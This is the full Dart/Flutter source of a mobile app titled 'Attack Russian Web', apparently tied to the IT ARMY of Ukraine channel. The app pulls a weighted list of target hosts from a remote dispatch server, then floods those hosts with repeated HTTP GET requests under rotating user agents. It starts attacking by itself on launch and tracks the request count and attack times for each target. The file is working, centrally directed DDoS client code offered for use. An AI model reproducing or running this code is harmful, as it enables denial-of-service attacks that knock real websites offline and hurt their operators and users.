import 'dart:convert';
import 'package:intl/intl.dart';
// import 'dart:ffi';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/widgets.dart';
import 'package:http/http.dart' as http;
import 'package:flutter/services.dart' show rootBundle;
import 'package:localization/localization.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:dart_random_choice/dart_random_choice.dart';
import 'package:localstorage/localstorage.dart';
import 'package:flutter_localizations/flutter_localizations.dart';

const textColor = Color(0xFFEAEAEA);
const grayColor = Color(0xFFC6C6C6);
const linkColor = Color(0xFF9AC9FF);

Uri serverEndpoint =
    Uri.parse("https://arwdispatch.redblackfury.com/get_targets");

Map logs = {};

void main() {
  runApp(MyApp());
}

Future<String> timeout(int d) {
  return Future.delayed(Duration(seconds: d), () => 'Large Latte');
}

Future<String> timeoutMilliseconds(int d) {
  return Future.delayed(Duration(milliseconds: d), () => 'Large Latte');
}

class MyApp extends StatefulWidget {
  // This widget is the root of your application.
  @override
  MyAppState createState() => MyAppState();
}

class MyAppState extends State<MyApp> {
  Locale? _locale;

  changeLocale(Locale locale) {
    setState(() {
      _locale = locale;
    });
  }

  @override
  Widget build(BuildContext context) {
    LocalJsonLocalization.delegate.directories = ['lib/i18n'];
    return MaterialApp(
      title: 'Attack Russian Web',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      locale: _locale,
      localizationsDelegates: [
        GlobalMaterialLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
        LocalJsonLocalization.delegate,
      ],
      supportedLocales: const [
        Locale('en', 'US'),
        Locale('uk', 'UA'),
      ],
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);
  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

const SHOOT_INTERVAL_SECOND = 5;
const MAX_LIMIT = 200;
const STEP_CHANGE_LIMIT = 10;
const NAME_STATUS_WORKER = 'statusWorker';
const LOCAL_STORAGE_ITEM_TOTAL_REQS = 'totalReqs';
const LOCAL_STORAGE_ITEM_UP_MS = 'upMs';

final LocalStorage STORAGE = new LocalStorage('arwStorage');
const UPDATE_VIEW_TIMEOUT_SECONDS = 1;

const WINDOW_SIZE_MS = 20000;
const WINDOW_TAIL_TO_HEAD_RATIO = 5; // 0.3 - tail - 0.7 head

const REFRESH_RPS_RATE_MS = 1000;

class _MyHomePageState extends State<MyHomePage> {
  int _limitRequests = 10;
  int _currentRPS = 0;
  int _totalRequests = 0;
  int _upMilliseconds = 0;
  bool _statusWorker = false;
  List _tasks = [];
  List<double> _weight = [];
  String _totalStringRequests = '0';
  DateTime windowStartState = DateTime.now();
  int requestsAtWindowState = 0;

  var _upTime = '0s';
  var _userAgent = '';
  var _myIp = '0.0.0.0';
  var _country = 'UA';

  @override
  void initState() {
    super.initState();
    asyncInit();
    moveFloatingRPSWindows();
    runRPSRefresher();
  }

  void asyncInit() async {
    await _initData();
    _intervalWorker();
    _intervalInitData();
    startWorker(false);
  }

  void moveFloatingRPSWindows() async {
    DateTime windowStart = DateTime.now();
    int requestsAtWindowStart = _totalRequests;
    while (true) {
      setState(() {
        windowStartState = windowStart;
        requestsAtWindowState = requestsAtWindowStart;
      });
      await timeoutMilliseconds(
          (WINDOW_SIZE_MS * WINDOW_TAIL_TO_HEAD_RATIO).toInt());
      windowStart = DateTime.now();
      requestsAtWindowStart = _totalRequests;
      await timeoutMilliseconds(
          (WINDOW_SIZE_MS * (1 - WINDOW_TAIL_TO_HEAD_RATIO)).toInt());
    }
  }

  void runRPSRefresher() async {
    while (true) {
      await timeoutMilliseconds(REFRESH_RPS_RATE_MS.toInt());
      int data = ((_totalRequests - requestsAtWindowState) /
              (DateTime.now().millisecondsSinceEpoch -
                  windowStartState.millisecondsSinceEpoch) *
              1000)
          .toInt();
      setState(() {
        _currentRPS = data;
      });
    }
  }

  void shootFetches() async {
    for (var i = 0; i < _limitRequests; i++) {
      final pointAttack = randomChoice(_tasks, _weight);
      Uri endpoint = Uri.parse("${pointAttack.proto}://${pointAttack.host}");

      http
          .get(endpoint, headers: {"User-Agent": _userAgent})
          .timeout(const Duration(seconds: 3))
          .catchError((e) {});
      _totalRequests += 1;
      logs[pointAttack.sId]["count"] += 1;
      logs[pointAttack.sId]["lastAttack"] = DateTime.now();
    }
  }

  void worker() async {
    if (_tasks.isEmpty) {
      changeStatusWorker(false);
      return;
    }

    while (true) {
      shootFetches();
      if (_statusWorker == false) {
        break;
      }
      await timeout(SHOOT_INTERVAL_SECOND);
    }
  }

  void startWorker(bool manual) async {
    await STORAGE.ready;
    var stateWorkerStorage = await STORAGE.getItem(NAME_STATUS_WORKER);
    int? historicalRqs = await STORAGE.getItem(LOCAL_STORAGE_ITEM_TOTAL_REQS);
    int? historicalMs = await STORAGE.getItem(LOCAL_STORAGE_ITEM_UP_MS);

    setState(() {
      _totalRequests = historicalRqs ?? 0;
      _upMilliseconds = historicalMs ?? 0;
    });

    if (stateWorkerStorage == 'disable' && manual == false) {
      return;
    }

    if (_statusWorker == false) {
      await changeStatusWorker(true);
      worker();
    }
  }

  Future<void> changeStatusWorker(bool status) async {
    await STORAGE.ready;
    STORAGE.setItem(NAME_STATUS_WORKER, status == true ? 'enable' : 'disable');
    setState(() {
      _statusWorker = status;
    });
  }

  void _intervalInitData() async {
    await timeout(20 * 60); // 20 min
    await _initData();
  }

  Future<void> _initData() async {
    final response = await http.get(serverEndpoint);
    var data = jsonDecode(response.body);
    Map tempLogs = logs;
    // set user agent
    var randomUserAgent = data['userAgents'] != null
        ? (data['userAgents'].toList()..shuffle()).first['string']
        : 'ARW';

    var country = data['countryISO'];
    List<double> weight = [];

    // set tasks
    var targetObjsJson = data['result'] as List;

    List<Target> targetObjs =
        targetObjsJson.map((item) => Target.fromJson(item)).toList();
    targetObjs = targetObjs.where((x) {
      if (x.enabled == false) {
        return false;
      }
      if (country == 'UA' && x.uaAllowed == false) {
        return false;
      }
      return true;
    }).toList();

    targetObjs.forEach((x) {
      weight.add(x.weight!.toDouble());
      if (tempLogs.containsKey(x.sId) != true) {
        tempLogs[x.sId] = {
          "host": x.host,
          "tag": x.tags,
          "proto": x.proto,
          "startAttack": DateTime.now(),
          "lastAttack": '',
          "count": 0
        };
      }
    });

    setState(() {
      _myIp = data['ip'];
      _country = country;
      _userAgent = randomUserAgent;
      _tasks = targetObjs;
      _weight = weight;
      logs = tempLogs;
    });
  }

  void changeLimitRequest(int value) {
    var tempValue = _limitRequests + value;

    if (tempValue <= MAX_LIMIT && tempValue > 0) {
      setState(() {
        _limitRequests = tempValue;
      });
    }
  }

  Future<void> _launchInBrowser(String url) async {
    if (!await launch(
      url,
      forceSafariVC: false,
      forceWebView: false,
    )) {
      throw 'Could not launch $url';
    }
  }

  String timeAfterLaunch() {
    int seconds = _upMilliseconds ~/ 1000;

    if (seconds > 86400) {
      return '${seconds ~/ 86400}d';
    } else if (seconds > 3600) {
      return '${seconds ~/ 3600}h';
    } else if (seconds > 60) {
      return '${seconds ~/ 60}m';
    }
    return '${seconds ~/ 1}s';
  }

  Future<void> _intervalWorker() async {
    while (true) {
      DateTime prevCycle = DateTime.now();
      await timeout(UPDATE_VIEW_TIMEOUT_SECONDS);

      await STORAGE.ready;
      STORAGE.setItem(LOCAL_STORAGE_ITEM_TOTAL_REQS, _totalRequests);
      STORAGE.setItem(LOCAL_STORAGE_ITEM_UP_MS, _upMilliseconds);
      setState(() {
        _upTime = timeAfterLaunch();
        _totalStringRequests = Formatter.formatter(_totalRequests);
      });
      DateTime now = DateTime.now();
      Duration diffTime = now.difference(prevCycle);
      _upMilliseconds += diffTime.inMilliseconds;
    }
  }

  @override
  Widget build(BuildContext context) {
    final locale = Localizations.localeOf(context);
    return Scaffold(
      body: Center(
        child: Container(
          width: double.infinity,
          decoration: BoxDecoration(
            gradient: gradient(),
          ),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Row(
                mainAxisAlignment: MainAxisAlignment.end,
                children: [
                  TextButton(
                      style: ButtonStyle(
                        backgroundColor: locale.countryCode == 'US'
                            ? MaterialStateProperty.all<Color>(
                                Color.fromARGB(170, 255, 255, 255))
                            : null,
                      ),
                      onPressed: () {
                        final myApp =
                            context.findAncestorStateOfType<MyAppState>()!;
                        myApp.changeLocale(Locale('en', 'US'));
                      },
                      child: Row(children: [
                        const Image(
                            image: AssetImage('assets/usauk.png'),
                            width: 30,
                            height: 20),
                        Text(
                          'Eng lang',
                          style: TextStyle(
                              fontSize: 14,
                              color: locale.countryCode == 'US'
                                  ? const Color(0xFF494949)
                                  : const Color(0xff9AC9FF)),
                        ),
                      ])),
                  TextButton(
                      style: ButtonStyle(
                        backgroundColor: locale.countryCode == 'UA'
                            ? MaterialStateProperty.all<Color>(
                                Color.fromARGB(170, 255, 255, 255))
                            : null,
                      ),
                      onPressed: () {
                        final myApp =
                            context.findAncestorStateOfType<MyAppState>()!;
                        myApp.changeLocale(Locale('uk', 'UA'));
                      },
                      child: Row(children: [
                        const Image(
                            image: AssetImage('assets/uk.png'),
                            width: 30,
                            height: 20),
                        Text(
                          'Укр мова',
                          style: TextStyle(
                              fontSize: 14,
                              color: locale.countryCode == 'UA'
                                  ? const Color(0xFF494949)
                                  : const Color(0xff9AC9FF)),
                        ),
                      ])),
                  const SizedBox(width: 20),
                ],
              ),
              const SizedBox(
                height: 30,
              ),
              Text(
                '__headline'.i18n(),
                style: TextStyle(fontSize: 16, color: textColor),
              ),
              const SizedBox(height: 20),
              Text(
                '__you_ip'.i18n(),
                style: TextStyle(fontSize: 14, color: textColor),
              ),
              const SizedBox(height: 5),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: <Widget>[
                  Image(
                      image: AssetImage('assets/country/$_country.png'),
                      width: 30,
                      height: 20),
                  const SizedBox(width: 5),
                  Text(
                    _myIp,
                    style: const TextStyle(fontSize: 14, color: textColor),
                  ),
                ],
              ),
              const SizedBox(height: 5),
              Text(
                '__helper_text_1'.i18n(),
                style: TextStyle(fontSize: 12, color: grayColor),
              ),
              const SizedBox(height: 20),
              Text(
                '__request_limit'.i18n(),
                style: TextStyle(fontSize: 14, color: textColor),
              ),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: <Widget>[
                  IconButton(
                    icon: Image.asset('assets/minus.png'),
                    iconSize: 5,
                    onPressed: () {
                      changeLimitRequest(-STEP_CHANGE_LIMIT);
                    },
                  ),
                  const SizedBox(width: 5),
                  Text(
                    '$_limitRequests',
                    style: const TextStyle(fontSize: 14, color: textColor),
                  ),
                  const SizedBox(width: 5),
                  IconButton(
                    icon: Image.asset('assets/plus.png'),
                    iconSize: 5,
                    onPressed: () {
                      changeLimitRequest(STEP_CHANGE_LIMIT);
                    },
                  ),
                ],
              ),
              Text(
                '__helper_text_3'.i18n(),
                style: TextStyle(fontSize: 12, color: grayColor),
              ),
              const SizedBox(height: 20),
              Text(
                '__current_requests'.i18n(),
                style: TextStyle(fontSize: 14, color: textColor),
              ),
              const SizedBox(height: 5),
              TextButton(
                style: TextButton.styleFrom(
                  padding: EdgeInsets.zero,
                  tapTargetSize: MaterialTapTargetSize.shrinkWrap,
                  minimumSize: Size.zero,
                  alignment: Alignment.topLeft,
                ),
                onPressed: () {
                  Navigator.push(
                    context,
                    MaterialPageRoute(builder: (context) => const LogRoute()),
                  );
                },
                child: Text(
                  '__which_sites'.i18n(),
                  style: const TextStyle(
                    fontSize: 12,
                    color: Color(0xFF9AC9FF),
                    decoration: TextDecoration.underline,
                  ),
                ),
              ),
              const SizedBox(height: 10),
              Text(
                '$_currentRPS',
                style: TextStyle(fontSize: 14, color: textColor),
              ),
              const SizedBox(height: 20),
              Text(
                '__total_requests'.i18n(),
                style: TextStyle(fontSize: 14, color: textColor),
              ),
              const SizedBox(height: 10),
              Text(
                '$_totalStringRequests',
                style: TextStyle(fontSize: 14, color: textColor),
              ),
              const SizedBox(height: 10),
              Text(
                'Up time: $_upTime',
                style: const TextStyle(fontSize: 12, color: grayColor),
              ),
              const SizedBox(height: 20),
              TextButton(
                style: ButtonStyle(
                  backgroundColor:
                      MaterialStateProperty.all<Color>(const Color(0xFF1F1A1A)),
                ),
                onPressed: () {
                  _statusWorker == true
                      ? changeStatusWorker(false)
                      : startWorker(true);
                },
                child: Text(
                  _statusWorker == true ? '__pause'.i18n() : '__start'.i18n(),
                  style: const TextStyle(fontSize: 12),
                ),
              ),
              const SizedBox(height: 40),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: <Widget>[
                  const Image(
                      image: AssetImage('assets/it_army.png'),
                      width: 32,
                      height: 32),
                  const SizedBox(width: 5),
                  Column(
                    children: <Widget>[
                      Text(
                        '__it_army'.i18n(),
                        textAlign: TextAlign.left,
                        style: TextStyle(fontSize: 14, color: textColor),
                      ),
                      TextButton(
                        style: TextButton.styleFrom(
                          padding: EdgeInsets.zero,
                          tapTargetSize: MaterialTapTargetSize.shrinkWrap,
                          minimumSize: Size.zero,
                          alignment: Alignment.topLeft,
                        ),
                        onPressed: () {
                          _launchInBrowser('https://t.me/itarmyofukraine2022');
                        },
                        child: const Text(
                          'IT ARMY of Ukraine',
                          style: TextStyle(fontSize: 12),
                        ),
                      )
                    ],
                  ),
                  const SizedBox(width: 20),
                  const Image(
                      image: AssetImage('assets/git.png'),
                      width: 32,
                      height: 32),
                  const SizedBox(width: 5),
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: <Widget>[
                      Text(
                        '__source_code'.i18n(),
                        style: TextStyle(fontSize: 14, color: textColor),
                      ),
                      TextButton(
                        style: TextButton.styleFrom(
                          padding: EdgeInsets.zero,
                          tapTargetSize: MaterialTapTargetSize.shrinkWrap,
                          minimumSize: Size.zero,
                          alignment: Alignment.topLeft,
                        ),
                        onPressed: () {
                          _launchInBrowser('https://github.com/redblackfury');
                        },
                        child: const Text(
                          'GitHub',
                          style: TextStyle(fontSize: 12),
                        ),
                      )
                    ],
                  )
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  LinearGradient gradient() {
    return const LinearGradient(
        colors: [
          Color(0xFFC00000),
          Color(0xFF000000),
        ],
        begin: FractionalOffset(0.0, 0.0),
        end: FractionalOffset(0.0, 1.0),
        stops: [0.0, 1.0],
        tileMode: TileMode.clamp);
  }
}

class Target {
  String? sId;
  String? url;
  String? host;
  String? proto;
  bool? uaAllowed;
  bool? enabled;
  String? tags;
  double? weight;

  Target(
      {this.sId,
      this.url,
      this.host,
      this.proto,
      this.uaAllowed,
      this.enabled,
      this.tags,
      this.weight});

  Target.fromJson(Map<String, dynamic> json) {
    sId = json['_id'];
    url = json['url'];
    host = json['host'];
    proto = json['proto'];
    uaAllowed = json['uaAllowed'];
    enabled = json['enabled'];
    tags = json['tags'];
    weight = json['weight'];
  }
}

class Formatter {
  static String formatter(int currentBalance) {
    try {
      if (currentBalance > 999 && currentBalance < 99999) {
        return "${(currentBalance / 1000).toStringAsFixed(1)}k";
      } else if (currentBalance > 99999 && currentBalance < 999999) {
        return "${(currentBalance / 1000).toStringAsFixed(0)}K";
      } else if (currentBalance > 999999 && currentBalance < 999999999) {
        return "${(currentBalance / 1000000).toStringAsFixed(1)}M";
      } else if (currentBalance > 999999999) {
        return "${(currentBalance / 1000000000).toStringAsFixed(1)}B";
      } else {
        return currentBalance.toString();
      }
    } catch (e) {
      print(e);
    }
    return '';
  }

  static String formatterDate(dynamic date) {
    try {
      final DateFormat formatter = DateFormat('H:m:s');
      final String formatted = formatter.format(date);
      return formatted;
    } catch (e) {
      return '';
    }
  }
}

const WIDTH_NAME = 100.0;

class LogRoute extends StatelessWidget {
  const LogRoute({Key? key}) : super(key: key);
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Container(
            width: double.infinity,
            color: const Color(0xFF292929),
            padding: EdgeInsets.all(30),
            child: SingleChildScrollView(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.start,
                mainAxisSize: MainAxisSize.max,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: <Widget>[
                  for (var key in logs.keys)
                    Column(
                      children: [
                        Row(
                          children: [
                            Container(
                                width: WIDTH_NAME,
                                child: Text(
                                  '__target_host'.i18n(),
                                  style: TextStyle(
                                      color: Color(0xFF9B9B9B), fontSize: 12),
                                )),
                            Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  logs[key]["host"],
                                  style: const TextStyle(
                                      color: Color(0xFF9AC9FF), fontSize: 12),
                                ),
                                true == true
                                    ? Text(
                                        logs[key]["tag"],
                                        textAlign: TextAlign.left,
                                        style: const TextStyle(
                                            color: Color(0xFFEAEAEA),
                                            fontSize: 12),
                                      )
                                    : const Text(''),
                              ],
                            )
                          ],
                        ),
                        const SizedBox(height: 10),
                        Row(
                          children: [
                            Container(
                                width: WIDTH_NAME,
                                child: Text(
                                  '__protocol'.i18n(),
                                  style: TextStyle(
                                      color: Color(0xFF9B9B9B), fontSize: 12),
                                )),
                            Text(
                              "${logs[key]["proto"] == 'http' ? '80' : '443'}/${logs[key]["proto"]}",
                              style: const TextStyle(
                                  color: Color(0xFFEAEAEA), fontSize: 12),
                            ),
                          ],
                        ),
                        const SizedBox(height: 10),
                        Row(
                          children: [
                            Container(
                                width: WIDTH_NAME,
                                child: Text(
                                  '__first_attack'.i18n(),
                                  style: TextStyle(
                                      color: Color(0xFF9B9B9B), fontSize: 12),
                                )),
                            Text(
                              Formatter.formatterDate(logs[key]["startAttack"]),
                              style: const TextStyle(
                                  color: Color(0xFFEAEAEA), fontSize: 12),
                            ),
                          ],
                        ),
                        const SizedBox(height: 10),
                        Row(
                          children: [
                            Container(
                                width: WIDTH_NAME,
                                child: Text(
                                  '__last_attack'.i18n(),
                                  style: TextStyle(
                                      color: Color(0xFF9B9B9B), fontSize: 12),
                                )),
                            Text(
                              Formatter.formatterDate(logs[key]["lastAttack"]),
                              style: const TextStyle(
                                  color: Color(0xFFEAEAEA), fontSize: 12),
                            ),
                          ],
                        ),
                        const SizedBox(height: 10),
                        Row(
                          children: [
                            Container(
                                width: WIDTH_NAME,
                                child: Text(
                                  '__requests_count'.i18n(),
                                  style: TextStyle(
                                      color: Color(0xFF9B9B9B), fontSize: 12),
                                )),
                            Text(
                              logs[key]["count"].toString(),
                              style: const TextStyle(
                                  color: Color(0xFFEAEAEA), fontSize: 12),
                            ),
                          ],
                        ),
                        const Divider(color: Color(0xFFEAEAEA))
                      ],
                    )
                ],
              ),
            )),
      ),
      floatingActionButton: FloatingActionButton(
        elevation: 100,
        autofocus: true,
        onPressed: () {
          Navigator.pop(context);
        },
        backgroundColor: const Color(0xFF1F1A1A),
        foregroundColor: const Color(0xFF1F1A1A),
        shape: const RoundedRectangleBorder(
            side: const BorderSide(color: Color(0xFF9AC9FF), width: 2.0),
            borderRadius: BorderRadius.all(Radius.circular(50.0))),
        child: const Text(
          'X',
          style: TextStyle(color: Color(0xFF9AC9FF)),
        ),
      ),
      floatingActionButtonLocation: FloatingActionButtonLocation.endTop,
    );
  }
}
